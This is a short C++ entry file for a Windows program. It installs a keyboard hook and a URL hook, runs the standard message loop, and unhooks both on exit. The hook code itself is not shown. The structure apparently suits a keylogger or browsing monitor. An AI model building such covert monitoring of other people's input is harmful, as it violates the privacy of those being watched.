#include <iostream>

#include "process/process.h"
#include "keyboard/keyboard.h"
#include "url/url.h"





int main(int, char**){
    MSG msg;
    
    hookKeyboard();
    hookUrl();
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    unhookKeyboard();
    unhookUrl();


    return 0;
}
